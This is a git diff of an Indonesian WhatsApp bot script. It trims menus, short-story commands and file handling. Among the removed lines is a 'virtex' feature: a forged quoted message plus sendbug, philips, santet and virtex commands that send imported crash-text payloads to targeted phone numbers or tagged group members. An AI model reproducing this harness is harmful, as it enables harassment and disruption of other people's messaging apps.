@@ -9,9 +9,7 @@ const { BufferJSON,
 const { downloadContentFromMessage,
   generateWAMessage,
   generateWAMessageFromContent,
-  MessageType,
-  buttonsMessage,
-  relayWAMessage } = require("@adiwajshing/baileys")
+  MessageType } = require("@adiwajshing/baileys")
 const { exec, spawn } = require("child_process");
 const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
 const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
@@ -20,20 +18,12 @@ const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGr
 const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, server_eror_JSON, welcome_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
 const { mediafireDl } = require('./function/scrape_Mediafire')
 const { webp2mp4File } = require("./function/Webp_Tomp4")
-const { cerpen } = require('./function/Search_Cerpen')
 const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat } = require('@bochilteam/scraper')
-const { listmenu, ownermenu, listcerpen, listtextpro, listephoto, rulesBot, donasiBot, infoOwner } = require('./help')
 const { jadibot, listJadibot } = require('./function/jadibot')
 
 //scraper
 const { instagram } = require("@xct007/frieren-scraper")
 const { File } = require("megajs")
-const urlexpand = require("urlexpand")
-
-// database virtex
-const { philips } = require('./function/virtex/philips')
-const { virus } = require('./function/virtex/virus')
-const { ngazap } = require('./function/virtex/ngazap')
 
 const fs = require("fs");
 const ms = require("ms");
@@ -148,29 +138,6 @@ module.exports = async (conn, msg, m, setting, store) => {
     function parseMention(text = '') {
       return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
     }
-
-    const virusnya = {
-      key: {
-        fromMe: false,
-        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
-      },
-      "message": {
-        "documentMessage": {
-          "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
-          "mimetype": "application/octet-stream",
-          "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
-          "fileLength": "64455",
-          "pageCount": 1,
-          "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-          "fileName": `Sedative-MD ${ngazap(prefix)}`,
-          "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
-        }
-      }
-    }
-
-    const q1 = q.split('&')[0];
-    const q2 = q.split('&')[1];
-    const q3 = q.split('&')[2];
 
     const isEmoji = (emo) => {
       let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
@@ -367,11 +334,6 @@ Video sedang dikirim...`)
       case 'tes':
         reply(`*Runtime :* ${runtime(process.uptime())}`)
         break
-      case 'infoowner':
-      case 'ownerinfo': {
-        reply(infoOwner)
-      }
-        break
       case 'owner':
         var owner_Nya = setting.ChatOwner
         sendContact(from, owner_Nya, setting.ownerName, msg)
@@ -399,10 +361,12 @@ Video sedang dikirim...`)
         adReply(`*_Please wait a few minutes..._*`, file.name, 'downloading...')
         var data = await file.downloadBuffer()
         if (/mp4/.test(data)) {
-          await conn.sendMessage(from, { document: data, mimetype: "video/mp4", fileName: file.name }, { quoted: msg })
-        } else {
-          await conn.sendMessage(from, { document: data, mimetype: "application/pdf", fileName: file.name }, { quoted: msg })
-        }
+          await conn.sendMessage(from, { document: data, mimetype: "video/mp4", fileName: `${file.name}.mp4` }, { quoted: msg })
+        } else if (/mkv/.test(data)) {
+          await conn.sendMessage(from, { document: data, mimetype: "video/x-matroska", fileName: `${file.name}.mkv` }, { quoted: msg })
+        } else if (/pdf/.test(data)) {
+          await conn.sendMessage(from, { document: data, mimetype: "application/pdf", fileName: `${file.name}.pdf` }, { quoted: msg })
+        } 
         break
 
       case 'instagram':
@@ -427,7 +391,7 @@ Video sedang dikirim...`)
         cptn += `*Link:* ${data.videoUrl}\n`
         adReply(cptn, data.judul, `Durasi: ${data.durasi}`, ftokoo)
         var hasil = await getBuffer(data.download)
-        await conn.sendMessage(from, { document: hasil, mimetype: "audio/mp4", fileName: data.judul })
+        await conn.sendMessage(from, { document: hasil, mimetype: "audio/mp4", fileName: `${data.judul}.mp3` })
         break
 
       case 'ytmp3':
@@ -484,10 +448,6 @@ _Wait Mengirim file..._
 
 
       // OWNER FITUR
-
-      case 'ownermenu':
-        adReply(`${ownermenu(prefix)}`, 'OWNER MENU', setting.footer)
-        break
 
       case 'resetlist':
         db_respon_list.splice('[]')
@@ -615,15 +575,16 @@ _Wait Mengirim file..._
         break
       case 'setppgrup': case 'setppgc':
         if (!isGroup) return reply(mess.OnlyGrup)
-        if (!isGroupAdmins) return reply(mess.GrupAdmin)
-        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
-        if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
-        await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
-        var media = `./transaksi/${sender.split('@')[0]}.jpg`
+        if (!isBotGroupAdmins) return
+        if (isImage || isQuotedImage) {
+          await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/setpp.jpg`)
+        await sleep(2000)
+          var media = './sticker/setpp.jpg'
         await conn.updateProfilePicture(from, { url: media })
         await sleep(2000)
         reply('Sukses mengganti foto profile group')
-        fs.unlinkSync(media)
+      }
+      fs.unlinkSync(media)
         break
       case 'setnamegrup': case 'setnamegc':
         if (!isGroup) return reply(mess.OnlyGrup)
@@ -778,6 +739,12 @@ _Wait Mengirim file..._
           fs.unlinkSync(mediany)
           fs.unlinkSync(rand2)
         }
+        break
+
+      case 'readmore':
+        var txt1 = q.split('|')[0]
+        var txt2 = q.split('|')[1]
+        await conn.sendMessage(from, { text: `${txt1}${readmore}${txt2}`})
         break
 
 
@@ -980,13 +947,6 @@ _Wait Mengirim file..._
         break
 
       // PHOTOOXY
-
-      case 'textpro':
-        adReply(`${listtextpro(prefix)}`, 'TEXT PRO', setting.footer, msg)
-        break
-      case 'ephoto':
-        adReply(`${listephoto(prefix)}`, 'EPHOTO', setting.footer, msg)
-        break
 
       case "metallic":
       case "naruto":
@@ -1300,301 +1260,7 @@ _Wait Mengirim file..._
         })
         break
 
-
-      // cerpen
-
-      case 'cerpen':
-        adReply(`${listcerpen(prefix)}`, 'Cerpen List', setting.footer, msg)
-        break
-
-      case 'cerpen-anak': {
-
-        let cerpe = await cerpen(`anak`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-bahasadaerah': {
-
-        let cerpe = await cerpen(`bahasa daerah`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-bahasainggris': {
-
-        let cerpe = await cerpen(`bahasa Inggris`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-bahasajawa': {
-
-        let cerpe = await cerpen(`bahasa jawa`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-bahasasunda': {
-
-        let cerpe = await cerpen(`bahasa sunda`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-budaya': {
-
-        let cerpe = await cerpen(`budaya`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cinta': {
-
-        let cerpe = await cerpen(`cinta`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintaislami': {
-
-        let cerpe = await cerpen(`cinta islami`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintapertama': {
-
-        let cerpe = await cerpen(`cinta pertama`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintaromantis': {
-
-        let cerpe = await cerpen(`cinta romantis`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintasedih': {
-
-        let cerpe = await cerpen(`cinta sedih`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintasegitiga': {
-
-        let cerpe = await cerpen(`Cinta segitiga`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-cintasejati': {
-
-        let cerpe = await cerpen(`cinta sejati`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-galau': {
-
-        let cerpe = await cerpen(`galau`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-gokil': {
-
-        let cerpe = await cerpen(`gokil`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-inspiratif': {
-
-        let cerpe = await cerpen(`inspiratif`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-jepang': {
-
-        let cerpe = await cerpen(`jepang`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-kehidupan': {
-
-        let cerpe = await cerpen(`kehidupan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-keluarga': {
-
-        let cerpe = await cerpen(`keluarga`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-kisahnyata': {
-
-        let cerpe = await cerpen(`kisah nyata`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-korea': {
-
-        let cerpe = await cerpen(`korea`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-kristen': {
-
-        let cerpe = await cerpen(`kristen`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-liburan': {
-
-        let cerpe = await cerpen(`liburan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-malaysia': {
-
-        let cerpe = await cerpen(`malaysia`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-mengharukan': {
-
-        let cerpe = await cerpen(`mengharukan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-misteri': {
-
-        let cerpe = await cerpen(`misteri`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-motivasi': {
-
-        let cerpe = await cerpen(`motivasi`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-nasihat': {
-
-        let cerpe = await cerpen(`nasihat`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-nasionalisme': {
-
-        let cerpe = await cerpen(`nasionalisme`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-olahraga': {
-
-        let cerpe = await cerpen(`olahraga`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-patahhati': {
-
-        let cerpe = await cerpen(`patah hati`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-penantian': {
-
-        let cerpe = await cerpen(`penantian`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-pendidikan': {
-
-        let cerpe = await cerpen(`pendidikan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-pengalaman': {
-
-        let cerpe = await cerpen(`pengalaman pribadi`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-pengorbanan': {
-
-        let cerpe = await cerpen(`pengorbanan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-penyesalan': {
-
-        let cerpe = await cerpen(`penyesalan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-perjuangan': {
-
-        let cerpe = await cerpen(`perjuangan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-perpisahan': {
-
-        let cerpe = await cerpen(`perpisahan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-persahabatan': {
-
-        let cerpe = await cerpen(`persahabatan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-petualangan': {
-
-        let cerpe = await cerpen(`petualangan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-ramadhan': {
-
-        let cerpe = await cerpen(`ramadhan`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-remaja': {
-
-        let cerpe = await cerpen(`remaja`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-rindu': {
-
-        let cerpe = await cerpen(`rindu`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-rohani': {
-
-        let cerpe = await cerpen(`rohani`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-romantis': {
-
-        let cerpe = await cerpen(`romantis`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-sastra': {
-
-        let cerpe = await cerpen(`sastra`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-sedih': {
-
-        let cerpe = await cerpen(`sedih`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
-      case 'cerpen-sejarah': {
-
-        let cerpe = await cerpen(`sejarah`)
-        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
-      }
-        break
+      
       case 'jadibot': {
         if (isGroup) return reply('Gunakan bot di privat chat')
         jadibot(conn, msg, from)
@@ -1663,227 +1329,6 @@ Kedalaman :${i.depth}\n\n`
       }
         break
 
-      // FIX BUG
-      case 'sendbug':
-      case 'philips': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '0@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('Itu Nomor Lu Sendiri')
-        await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim philips to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'philips2': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('Itu Nomor Lu Sendiri')
-        await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'philips3': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('Itu Nomor Lu Sendiri')
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: philips }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'santet': {
-        if (!isGroup) return reply(mess.OnlyGrup)
-        var number;
-        if (mentionUser.length !== 0) {
-          number = mentionUser[0]
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else if (isQuotedMsg) {
-          number = quotedMsg.sender
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else {
-          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
-        }
-      }
-        break
-      case 'santet2': {
-        if (!isGroup) return reply(mess.OnlyGrup)
-        var number;
-        if (mentionUser.length !== 0) {
-          number = mentionUser[0]
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else if (isQuotedMsg) {
-          number = quotedMsg.sender
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else {
-          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
-        }
-      }
-        break
-      case 'santet3': {
-        if (!isGroup) return reply(mess.OnlyGrup)
-        var number;
-        if (mentionUser.length !== 0) {
-          number = mentionUser[0]
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else if (isQuotedMsg) {
-          number = quotedMsg.sender
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          await sleep(3000)
-          conn.sendMessage(number, { text: philips }, { quoted: virusnya })
-          mentions(`Sukses kirim *${command}* to @${number.split('@')[0]}`, [number])
-        } else {
-          reply('Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag')
-        }
-      }
-        break
-      case 'virtex': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
